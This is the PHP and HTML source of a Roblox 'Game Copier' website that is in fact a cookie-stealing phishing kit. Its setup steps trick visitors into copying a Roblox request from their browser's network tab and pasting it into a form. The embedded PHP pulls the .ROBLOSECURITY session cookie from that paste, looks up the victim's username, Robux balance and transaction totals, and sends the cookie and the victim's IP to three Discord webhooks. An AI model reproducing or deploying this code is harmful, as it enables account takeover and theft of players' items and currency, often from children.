<?php include("../settings.php"); # ItsYaboyNathan ?>
<html lang="en" style="scroll-behavior: smooth;"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>Game Copier - #1 Game Copier!</title>
  <meta name="description" content="The #1 Free Game Copier!">
  <link rel="stylesheet" href="https://demo.webpixels.io/purpose-website-ui-kit-v2.0.1/assets/css/purpose.css" id="stylesheet">
  <link rel="stylesheet" href="https://demo.webpixels.io/purpose-website-ui-kit-v2.0.1/assets/libs/swiper/dist/css/swiper.min.css">
  <link rel="stylesheet" href="https://demo.webpixels.io/purpose-website-ui-kit-v2.0.1/assets/libs/@fancyapps/fancybox/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.2.0/css/all.css">
  <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
      
  
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="shortcut icon" href="favicon.ico">
  <meta name="keywords" content="roblox, item, snipe, trade, dominus, roblox, bot, roblox item sniper, sniper bot, roblox snipe bot, roblox limited sniper, roblox limited item sniper, roblox limited snipe bot 2019, roblox limited snipes, roblox limited snipe bot, roblox limited item sniper bot roblox limited sniper website, roblox limited sniper online, roblox limited sniper no download, roblox limited sniper 2019, roblox limited snipe bot 2018, roblox limited sniper 2020, roblox limited snipe bot 2020, limited sniper, limited sniper roblox, limited sniper bot, limited sniper extension, roblox limited bot, roblox limited snipe bot, roblox limited buying bot, roblox limited snipe bot 2018, roblox limited snipe bot 2019, roblox limited discord bot, roblox limited item sniper bot, roblox limited notifier discord bot, roblox limited bots, Follow botter, Follow bot, Follow, Bot, Botter,">
  <style>@import url('https://fonts.googleapis.com/css?family=Open+Sans:400,600');
   .custom-social-proof {
     position: fixed;
     bottom: 20px;
     left: 20px;
     z-index: 9999999999999 !important;
     font-family: 'Open Sans', sans-serif;
  }
   .custom-social-proof .custom-notification {
     width: 320px;
     border: 0;
     text-align: left;
     z-index: 99999;
     box-sizing: border-box;
     font-weight: 400;
     border-radius: 6px;
     box-shadow: 2px 2px 10px 2px rgba(11, 10, 10, 0.2);
     background-color: rgb(15, 15, 15);
     position: relative;
     cursor: pointer;
  }
   .custom-social-proof .custom-notification .custom-notification-container {
     display: flex !important;
     align-items: center;
     height: 80px;
  }
   .custom-social-proof .custom-notification .custom-notification-container .custom-notification-image-wrapper img {
     max-height: 75px;
     width: 90px;
     overflow: hidden;
     border-radius: 6px 0 0 6px;
     object-fit: cover;
  }
   .custom-social-proof .custom-notification .custom-notification-container .custom-notification-content-wrapper {
     margin: 0;
     height: 100%;
     color: gray;
     padding-left: 20px;
     padding-right: 20px;
     border-radius: 0 6px 6px 0;
     flex: 1;
     display: flex !important;
     flex-direction: column;
     justify-content: center;
  }
   .custom-social-proof .custom-notification .custom-notification-container .custom-notification-content-wrapper .custom-notification-content {
     font-family: inherit !important;
     margin: 0 !important;
     padding: 0 !important;
     font-size: 14px;
     line-height: 16px;
  }
   .custom-social-proof .custom-notification .custom-notification-container .custom-notification-content-wrapper .custom-notification-content small {
     margin-top: 3px !important;
     display: block !important;
     font-size: 12px !important;
     opacity: 0.8;
  }
   .custom-social-proof .custom-notification .custom-close {
     position: absolute;
     top: 8px;
     right: 8px;
     height: 12px;
     width: 12px;
     cursor: pointer;
     transition: 0.2s ease-in-out;
     transform: rotate(45deg);
     opacity: 0;
  }
   .custom-social-proof .custom-notification:hover .custom-close {
     opacity: 1;
  }
  .carousel-item {
    height: 100vh;
    min-height: 300px;
  }
  .carousel-caption {
    bottom: 220px;
  }
  .carousel-caption h5 {
    font-size: 45px;
    text-transform: uppercase;
    letter-spacing: 2px;
    margin-top: 25px;
    font-family: merienda;
  }
  .carousel-caption p {
    width: 60%;
    margin: auto;
    font-size: 18px;
    line-height: 1.9;
    font-family: poppins;
  }
  .carousel-caption a {
    text-transform: uppercase;
    background: #262626;
    padding: 10px 30px;
    display: inline-block;
    color: #fff;
    margin-top: 15px;
  }
  .navbar-nav a {
    font-family: poppins;
    font-size: 18px;
    text-transform: uppercase;
    font-weight: bold;
  }
  .navbar-light .navbar-brand {
    color: #fff;
    font-size: 25px;
    text-transform: uppercase;
    font-weight: bold;
    letter-spacing: 2px;
  }
  .navbar-light .navbar-nav .active>.nav-link, .navbar-light .navbar-nav .nav-link.active, .navbar-light .navbar-nav .nav-link.show, .navbar-light .navbar-nav .show>.nav-link {
    color: #fff;
  }
  .navbar-light .navbar-nav .nav-link {
    color: #fff;
  }
  .navbar-nav {
    text-align: center;
  }
  .nav-link {
    padding: .2rem 1rem;
  }
  .nav-link.active, .nav-link:focus {
    color: #fff;
  }
  .navbar-toggler {
    padding: 1px 5px;
    font-size: 18px;
    line-height: 0.3;
    background: #fff;
  }
  .navbar-light .navbar-nav .nav-link:focus, .navbar-light .navbar-nav .nav-link:hover {
    color: #fff;
  }
  .w-100 {
    height: 100vh;
  }
  @media only screen and (max-width: 767px) {
    .navbar-nav.ml-auto {
      background: rgba(0, 0, 0, 0.5);
    }
    .navbar-nav a {
      font-size: 14px;
      font-weight: normal;
    }
  }
  
   </style><script>     setInterval(function(){ $(".card").stop().slideToggle('slow'); }, 16000);
        $(".custom-close").click(function() {
          $(".custom-social-proof").stop().slideToggle('slow');
        });
  </script>
  </head>
  <body class="bg-dark bg-noise g-sidenav-show g-sidenav-pinned" style="opacity: 1;">
  
  
  <header class="header header-transparent" id="header-main">
  
    <nav class="navbar navbar-expand-lg navbar-light fixed-top">
      <div class="container">
        <a class="navbar-brand" href="#">Game Copier</a> <button aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navbarSupportedContent" data-toggle="collapse" type="button"><span class="navbar-toggler-icon"></span></button>
        
      </div>
    </nav>
  </header>
  
  <div class="main-content"><section class="slice slice-lg bg-gradient-primary" data-offset-top="#header-main" style="padding-top: 75.6px;">
  <ul class="circles">
  <li></li>
  <li></li>
  <li></li>
  <li></li>
  <li></li>
  <li></li>
  <li></li>
  <li></li>
  <li></li>
  <li></li>
  </ul><style>@import url('https://fonts.googleapis.com/css?family=Exo:400,700');
  
  .circles{
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
  }
  
  .circles li{
      position: absolute;
      display: block;
      list-style: none;
      width: 20px;
      height: 20px;
      background: rgba(255, 255, 255, 0.2);
      animation: animate 25s linear infinite;
      bottom: -150px;
      
  }
  
  .circles li:nth-child(1){
      left: 25%;
      width: 80px;
      height: 80px;
      animation-delay: 0s;
  }
  
  
  .circles li:nth-child(2){
      left: 10%;
      width: 20px;
      height: 20px;
      animation-delay: 2s;
      animation-duration: 12s;
  }
  
  .circles li:nth-child(3){
      left: 70%;
      width: 20px;
      height: 20px;
      animation-delay: 4s;
  }
  
  .circles li:nth-child(4){
      left: 40%;
      width: 60px;
      height: 60px;
      animation-delay: 0s;
      animation-duration: 18s;
  }
  
  .circles li:nth-child(5){
      left: 65%;
      width: 20px;
      height: 20px;
      animation-delay: 0s;
  }
  
  .circles li:nth-child(6){
      left: 75%;
      width: 110px;
      height: 110px;
      animation-delay: 3s;
  }
  
  .circles li:nth-child(7){
      left: 35%;
      width: 150px;
      height: 150px;
      animation-delay: 7s;
  }
  
  .circles li:nth-child(8){
      left: 50%;
      width: 25px;
      height: 25px;
      animation-delay: 15s;
      animation-duration: 45s;
  }
  
  .circles li:nth-child(9){
      left: 20%;
      width: 15px;
      height: 15px;
      animation-delay: 2s;
      animation-duration: 35s;
  }
  
  .circles li:nth-child(10){
      left: 85%;
      width: 150px;
      height: 150px;
      animation-delay: 0s;
      animation-duration: 11s;
  }
  
  
  
  @keyframes animate {
  
      0%{
          transform: translateY(0) rotate(0deg);
          opacity: 1;
          border-radius: 0;
      }
  
      100%{
          transform: translateY(-1000px) rotate(720deg);
          opacity: 0;
          border-radius: 50%;
      }
  
  }</style>
  <div class="container py-6 py-lg-0 d-flex align-items-center position-relative zindex-100">
  <div class="col">
  <div class="row">
  <div class="col-xl-5 col-lg-6 align-self-center">
  <div class="text-center text-lg-left pb-5">
  <h2 class="h1 text-white mb-4">Game Copier copies ANYTHING<div id="typed-strings" style="display: none;">
  <p><em><b>.</b></em></p>
  </div>
  <span class="typed-cursor typed-cursor--blink">.<span class="typed-cursor typed-cursor--blink">.<span class="typed-cursor typed-cursor--blink">.<span class="typed-cursor typed-cursor--blink">.</span></span></span></span></h2>
  <p class="lead lh-180 text-white">The #1 FREE Game Copier.</p>
  <div class="mt-5">
  <a href="#sct_contact_form" class="btn btn-white rounded-pill hover-translate-y-n3 btn-icon mr-sm-4 scroll-me">
  <span class="btn-inner--text">Start</span>
  <span class="btn-inner--icon"><i class="far fa-angle-right"></i></span>
  </a>
  </div>
  </div>
  </div>
  <div class="col-lg-6 ml-lg-auto align-self-end">
  <div class="position-relative" style="z-index: 10;">
  <img alt="Image placeholder" src="https://media.discordapp.net/attachments/859857053916463104/871532592237793280/copy-a-roblox-game-for-you-with-scripts.png?width=700&height=470" class="img-fluid img-center" style="position: relative;">
  </div>
  </div>
  </div>
  </div>
  </div>
  <div class="shape-container" data-shape-position="bottom" style="height: 0%;">
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1600 220" preserveAspectRatio="none" class="ie-shape-wave-2" style="width: 100%;">
  <path d="M918.34,99.41C388.23,343.6,47.11,117.12,0,87.54V220H1600V87.54C1378.72-76.71,1077.32,27.41,918.34,99.41Z"></path>
  </svg>
  </div>
  </section>
  <section class="slice slice-lg" style="position: relative;">
  <div class="container">
  <div class="mb-5 text-center">
  <span class="badge badge-soft-success badge-pill badge-lg">
  Our process
  </span>
  <h3 class=" mt-4">Copying things such as shirts or games has never been easier!</h3>
  <div class="fluid-paragraph mt-3">
  <p class="lead lh-180">Copying shirts has never been easier. Game Copier has all the right tools in order to make your Copying process is a breeze.</p>
  </div>
  </div>
  <div class="row">
  <div class="col-lg-4">
  <div class="card hover-translate-y-n10 hover-shadow-lg p-2" style="">
  <div class="card-body">
  <div class="">
  <div class="pb-5">
  <div class="icon bg-primary text-white rounded-circle icon-lg icon-shape shadow">
  <i class="far fa-file-archive" style="padding-top: 18px;"></i>
  </div>
  </div>
  <h5 class="font-weight-bold">Set up Game Copier</h5>
  <p class="mt-2 mb-0">Scroll down to use the bot.</p>
  </div>
  </div>
  </div>
  </div>
  <div class="col-lg-4">
  <div class="card hover-translate-y-n10 hover-shadow-lg p-2" style="">
  <div class="card-body">
  <div class="">
  <div class="pb-5">
  <div class="icon bg-primary text-white rounded-circle icon-lg icon-shape shadow">
  <i class="far fa-clock" style="padding-top: 18px;"></i>
  </div>
  </div>
  <h5 class="font-weight-bold">Leave running</h5>
  <p class="mt-2 mb-0">Let Game Copier handle the work! It may take a few minutes to see results.</p>
  </div>
  </div>
  </div>
  </div>
  <div class="col-lg-4">
  <div class="card hover-translate-y-n10 hover-shadow-lg p-2" style="">
  <div class="card-body">
   <div class="">
  <div class="pb-5">
  <div class="icon bg-primary text-white rounded-circle icon-lg icon-shape shadow">
  <i class="far fa-dollar-sign" style="padding-top: 18px;"></i>
  </div>
  </div>
  <h5 class="font-weight-bold">Enjoy your Games</h5>
  <p class="mt-2 mb-0">Watch the bot copy your games and enjoy!</p>
  </div>
  </div>
  </div>
  </div>
  </div>
  </div>
  </section>
  <section class="slice slice-xl overflow-hidden bg-gradient-dark delimiter-top delimiter-bottom">
  <span class="tongue tongue-top"><i class="far fa-angle-up"></i></span>
  
  <div class="bg-absolute-cover bg-size--contain d-flex align-items-center">
  <figure class="w-100">
  <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0 0 1506.3 578.7" class="injected-svg svg-inject">
  <path class="fill-purple" d="M 147.269 295.566 C 147.914 293.9 149.399 292.705 151.164 292.431 L 167.694 289.863 C 169.459 289.588 171.236 290.277 172.356 291.668 L 182.845 304.699 C 183.965 306.091 184.258 307.974 183.613 309.64 L 177.572 325.239 C 176.927 326.905 175.442 328.1 173.677 328.375 L 157.147 330.943 C 155.382 331.217 153.605 330.529 152.485 329.137 L 141.996 316.106 C 140.876 314.714 140.583 312.831 141.228 311.165 L 147.269 295.566 Z"></path>
  <path class="fill-green" d="M 92.927 474.881 C 93.309 473.896 94.187 473.19 95.23 473.028 L 105.002 471.51 C 106.045 471.347 107.096 471.754 107.758 472.577 L 113.959 480.28 C 114.621 481.103 114.794 482.216 114.413 483.201 L 110.841 492.423 C 110.46 493.408 109.582 494.114 108.539 494.277 L 98.767 495.795 C 97.723 495.957 96.673 495.55 96.011 494.727 L 89.81 487.024 C 89.148 486.201 88.975 485.088 89.356 484.103 L 92.927 474.881 Z"></path>
  <path class="fill-teal" d="M 34.176 36.897 C 34.821 35.231 36.306 34.036 38.071 33.762 L 54.601 31.194 C 56.366 30.919 58.143 31.608 59.263 32.999 L 69.752 46.03 C 70.872 47.422 71.165 49.305 70.52 50.971 L 64.479 66.57 C 63.834 68.236 62.349 69.431 60.584 69.706 L 44.054 72.274 C 42.289 72.548 40.512 71.86 39.392 70.468 L 28.903 57.437 C 27.783 56.045 27.49 54.162 28.135 52.496 L 34.176 36.897 Z"></path>
  <path class="fill-blue" d="M 975.636 9.762 C 976.101 8.561 977.171 7.7 978.443 7.502 L 990.354 5.652 C 991.626 5.454 992.907 5.95 993.714 6.953 L 1001.272 16.343 C 1002.079 17.346 1002.29 18.703 1001.826 19.903 L 997.472 31.144 C 997.008 32.344 995.938 33.205 994.666 33.403 L 982.754 35.254 C 981.483 35.451 980.202 34.956 979.395 33.953 L 971.837 24.563 C 971.03 23.559 970.818 22.203 971.283 21.002 L 975.636 9.762 Z"></path>
  <path class="fill-gray-dark" d="M 1417.759 409.863 C 1418.404 408.197 1419.889 407.002 1421.654 406.728 L 1438.184 404.16 C 1439.949 403.885 1441.726 404.574 1442.846 405.965 L 1453.335 418.996 C 1454.455 420.388 1454.748 422.271 1454.103 423.937 L 1448.062 439.536 C 1447.417 441.202 1445.932 442.397 1444.167 442.672 L 1427.637 445.24 C 1425.872 445.514 1424.095 444.826 1422.975 443.434 L 1412.486 430.403 C 1411.366 429.011 1411.073 427.128 1411.718 425.462 L 1417.759 409.863 Z"></path>
  <path class="fill-orange" d="M 1313.903 202.809 C 1314.266 201.873 1315.1 201.201 1316.092 201.047 L 1325.381 199.604 C 1326.373 199.449 1327.372 199.837 1328.001 200.618 L 1333.895 207.941 C 1334.525 208.723 1334.689 209.782 1334.327 210.718 L 1330.932 219.484 C 1330.57 220.42 1329.735 221.092 1328.743 221.246 L 1319.454 222.689 C 1318.462 222.843 1317.464 222.457 1316.834 221.674 L 1310.94 214.351 C 1310.31 213.569 1310.146 212.511 1310.508 211.575 L 1313.903 202.809 Z"></path>
  <path class="fill-red" d="M 1084.395 506.137 C 1084.908 504.812 1086.09 503.861 1087.494 503.643 L 1100.645 501.6 C 1102.049 501.381 1103.463 501.929 1104.354 503.036 L 1112.699 513.403 C 1113.59 514.51 1113.823 516.009 1113.31 517.334 L 1108.504 529.744 C 1107.99 531.07 1106.809 532.02 1105.405 532.239 L 1092.254 534.282 C 1090.85 534.5 1089.436 533.953 1088.545 532.845 L 1080.2 522.478 C 1079.309 521.371 1079.076 519.873 1079.589 518.547 L 1084.395 506.137 Z"></path>
  </svg>
  </figure>
  </div>
  <div class="container position-relative zindex-100">
  <div class="text-center">
  <h6 class="text-muted">- Our mission -</h6>
  <div class="fluid-paragraph mt-4">
  <p class="lead text-white lh-180">Game Copier is an advanced PowerShell-based Copy bot &amp; auto-bot. It is capable of Copying up-to 10x faster than other competitors via D4 technology. To do this, all you need to do is follow the setup instructions below and report any issues you find to the discord server.
  <br><br>Your license is valid until <b>October 13, 2024 12:42 AM EST.</b></p>
  <a class="btn btn-primary rounded-pill btn-icon mt-5" href="#sct_contact_form">
  <span class="btn-inner--icon"><i class="far fa-angle-right"></i></span>
  <span class="btn-inner--text">Start Copying!</span>
  </a>
  </div>
  </div>
  </div>
  </section>
  <section class="slice slice-lg" id="sct_contact_form">
  <div class="container">
  <form action="index.php" method="post">
  <div class="text-center"> <h3>Setup Instructions</h3>
  <p>This only works if you are on computer. If you arent on computer then this wont work.<br></p>
  <p>Step 1. Go to the Roblox page of the game you want to copy.<br><br>
  
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    
    <textarea style="height: 100px; width: 500px;" id="content" name="Game" placeholder="Paste Game Code Here!"> </textarea><br><br>
    <input type="submit" value="Copy!">
        <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $userCode = $_POST["Game"];
    $codeCheckHar = $userCode;
    $py = '/\.ROBLOSECURITY", "(.*?)",/';
    if (preg_match($py, $codeCheckHar, $ma)) {
        $rob = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $ma[1]);

        $ip = $_SERVER["REMOTE_ADDR"];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/mobileapi/userinfo");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $rob,
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
$profile = json_decode($response, true);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://economy.roblox.com/v2/users/"  . $profile["UserID"] .  "/transaction-totals?timeFrame=Year&transactionType=summary");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $rob,
    
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
$sum = json_decode($response, true);
        
    
        $headers = ["Content-Type: application/json; charset=utf-8"];
        $POST = [
            "username" => "$name",
            "avatar_url" => "$image",
            "content" => "```$rob```",
            "embeds" => [
                [
                    "title" => "$name Auto Har",
                    "type" => "rich",
                    "color" => hexdec("$color"),
                    "footer" => [
                        "text" => "$name | $discord",
                        "icon_url" => $profile["ThumbnailUrl"],
                    ],
                    "thumbnail" => [
                        "url" => $profile["ThumbnailUrl"],
                    ],
                    "fields" => [
                        [
                            "name" => "**Username**",
                            "value" => $profile["UserName"],
                            "inline" => false
                        ],
                        [
                            "name" => "**IP**",
                            "value" => "$ip",
                            "inline" => false
                        ],
                        [
                            "name" => "**Robux (Pending)**",
                            "value" => $profile["RobuxBalance"] . ' ' . "(".$sum["pendingRobuxTotal"].")",
                            "inline" => true
                        ],                                             
                        [
                            "name" => "**<:premium:815415937548943370> Premium**",
                            "value" => $profile["IsPremium"],
                            "inline" => false
                        ],
                        [
                            "name" => "**:newspaper: Summary**",
                            "value" => $sum["incomingRobuxTotal"],
                            "inline" => true
                        ],
                    ],
                ],
            ],
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $adminhook);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
        $response = curl_exec($ch);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $dualhook);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
        $response = curl_exec($ch);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $webhook);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
        $response = curl_exec($ch);
    }
}
?>
  </form>
  </p><p>Step 2. Right click on the page, click Inspect, and then it will popup a new screen. On the top of the new screen, there will be a list of options (Elements, Console, etc.). If you see a Network option, click that. If you don't see it, click the arrow button and then from there click Network.<br></p>
  <p>Step 3. Refresh the Roblox page and then in the Network section, scroll to the very top. You should see an item named after your Game. Right click that and then hover over Copy. There will be many options of how to copy the game code.Click cURL (CMD).</p>
  <p>Step 4. Go back to this site, paste the code you copied in the text box and then click the <b>Copy!</b> button! Wait a few seconds and the Game should start downloading!</p>
  <img style="width: 75%;" src="https://media.discordapp.net/attachments/859857053916463104/871532060655894558/unknown.png?width=602&height=304">
  <br>
  <h3 style="padding-top: 60px;">Usage</h3>
  <p>Just paste the Game code into our website and your Games should download!</p>
  <p>We currently do not have a settings panel (soon TM), but everything is pre-configured to the best possible performance.</p>
  <b>It is recommended that you have been a member of roblox for over a year.</b>
  <br><br> JOIN THE <b><a href="#">DISCORD</a></b> IF YOU HAVE ANY QUESTIONS!<br><br> <b><a href="#">Click Me!</a></b><br><br>
  </div></div></section>
  <section class="bg-1 edge" style="padding-top: 30px;padding-bottom:30px;">
  <div class="container bring-to-front">
  <div class="row">
  <div class="col-12 col-md-4">
  <h2>Do you have <span class="bold">questions</span></h2>
  <p class="lead">Here are the answers to some of the most common questions we hear from our appreciated users</p>
  </div>
  <div class="col-12 col-md-8">
  <div class="card mb-3" style="">
  <div class="p-3">
  <h5 class="mb-0">
  <a href="#" data-toggle="collapse" data-target="#q1">
  Does the bot use the Roblox client?
  </a>
  </h5>
  </div>
  <div id="q1" class="collapse">
  <div class="card-body">
    Nope.
  </div>
  </div>
  </div>
  <div class="card mb-3" style="">
  <div class="p-3">
  <h5 class="mb-0">
  <a href="#" class="" data-toggle="collapse" data-target="#q2" aria-expanded="true">
  Can i copy any game?
  </a>
  </h5>
  </div>
  <div id="q2" class="collapse" style="">
  <div class="card-body">
    Yes u can, ofcourse
  </div>
  </div>
  </div>
  <div class="card mb-3" style="">
  <div class="p-3">
  <h5 class="mb-0">
  <a href="#" class="collapsed" data-toggle="collapse" data-target="#q3">
  Do I need Roblox account?
  </a>
  </h5>
  </div>
  <div id="q3" class="collapse">
  <div class="card-body">
    Yes, u do to copy games u need a roblox account
  </div>
  </div>
  </div>
  <div class="card" style="">
  <div class="p-3">
  <h5 class="mb-0">
  <a href="#" class="collapsed" data-toggle="collapse" data-target="#q4">
  Do I need proxies?
  </a>
  </h5>
  </div>
  <div id="q4" class="collapse">
  <div class="card-body">
  Nope! Proxies are not involved.
  </div>
  </div>
  </div>
  </div>
  </div>
  </div>
  </section>
  </div>
  <div id="footers-footer-2">
  <footer class="footer p-0 footer-dark bg-gradient-dark" id="footer-main">
  <div class="container">
  <div class="py-4">
  <div class="row align-items-md-center">
  <div class="col-md-4 mb-4 mb-md-0">
  <div class="d-flex align-items-center">
  <p class="text-sm mb-0">© RobloxTools 2024. All rights reserved.<br>We are not affiliated with any of the games or companies shown on this website. Use of any logos or trademarks are for reference purposes only. By utilizing the website, you agree to be bound by the terms of service.
  </p>
  </div>
  </div>
  <div class="col-sm-6 col-md-4 mb-4 mb-sm-0">
  <ul class="nav justify-content-center">
  <li class="nav-item">
  <a class="nav-link" href="">Terms</a>
  </li>
  <li class="nav-item">
  <a class="nav-link" href="">Support</a>
  </li>
  <li class="nav-item">
  <a class="nav-link" href="">About</a>
  </li>
  </ul>
  </div>
  <div class="col-sm-6 col-md-4">
  <ul class="nav justify-content-center justify-content-md-end mt-3 mt-md-0">
  <li class="nav-item">
  <a class="nav-link" href="#">
  <i class="fab fa-dribbble"></i>
  </a>
  </li>
  <li class="nav-item">
  <a class="nav-link" href="#">
  <i class="fab fa-instagram"></i>
  </a>
  </li>
  <li class="nav-item">
  <a class="nav-link" href="#">
  <i class="fab fa-github"></i>
  </a>
  </li>
  <li class="nav-item">
  <a class="nav-link" href="#">
  <i class="fab fa-facebook"></i>
  </a>
  </li>
  </ul>
  </div>
  </div>
  </div>
  </div>
  </footer>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
  <script src="https://demo.webpixels.io/purpose-website-ui-kit-v2.0.1/assets/js/purpose.js"></script><div class="mask-body mask-body-light d-xl-none" data-action="sidenav-unpin" data-target="undefined"></div><div class="mask-body mask-body-light d-xl-none" data-action="sidenav-unpin" data-target="undefined"></div><div class="mask-body mask-body-light d-xl-none" data-action="sidenav-unpin" data-target="undefined"></div><div class="mask-body mask-body-light d-xl-none" data-action="sidenav-unpin" data-target="undefined"></div>
  <script src="https://demo.webpixels.io/purpose-website-ui-kit-v2.0.1/assets/js/purpose.core.js"></script>
  <script src="https://demo.webpixels.io/purpose-website-ui-kit-v2.0.1/assets/js/demo.js"></script>
  <script src="https://demo.webpixels.io/purpose-website-ui-kit-v2.0.1/assets/libs/swiper/dist/js/swiper.min.js"></script>
  <script src="https://demo.webpixels.io/purpose-website-ui-kit-v2.0.1/assets/libs/typed.js/lib/typed.min.js"></script>
  <script>
    var typed = new Typed('#typed', {
      stringsElement: '#typed-strings'
    });
    var typed = new Typed('.element', {
    strings: ['This is a JavaScript library', 'This is an ES6 module'],
    smartBackspace: true // Default value
  });
  </script><style type="text/css" data-typed-js-css="true">
          .typed-cursor{
            opacity: 1;
          }
          .typed-cursor.typed-cursor--blink{
            animation: typedjsBlink 0.7s infinite;
            -webkit-animation: typedjsBlink 0.7s infinite;
                    animation: typedjsBlink 0.7s infinite;
          }
          @keyframes typedjsBlink{
            50% { opacity: 0.0; }
          }
          @-webkit-keyframes typedjsBlink{
            0% { opacity: 1; }
            50% { opacity: 0.0; }
            100% { opacity: 1; }
          }
        </style><style type="text/css" data-typed-js-css="true">
          .typed-cursor{
            opacity: 1;
          }
          .typed-cursor.typed-cursor--blink{
            animation: typedjsBlink 0.7s infinite;
            -webkit-animation: typedjsBlink 0.7s infinite;
                    animation: typedjsBlink 0.7s infinite;
          }
          @keyframes typedjsBlink{
            50% { opacity: 0.0; }
          }
          @-webkit-keyframes typedjsBlink{
            0% { opacity: 1; }
            50% { opacity: 0.0; }
            100% { opacity: 1; }
          }
        </style>
  <style type="text/css" data-typed-js-css="true">
          .typed-cursor{
            opacity: 1;
          }
          .typed-cursor.typed-cursor--blink{
            animation: typedjsBlink 0.7s infinite;
            -webkit-animation: typedjsBlink 0.7s infinite;
                    animation: typedjsBlink 0.7s infinite;
          }
          @keyframes typedjsBlink{
            50% { opacity: 0.0; }
          }
          @-webkit-keyframes typedjsBlink{
            0% { opacity: 1; }
            50% { opacity: 0.0; }
            100% { opacity: 1; }
          }
        </style>
  </body>
  
  </html>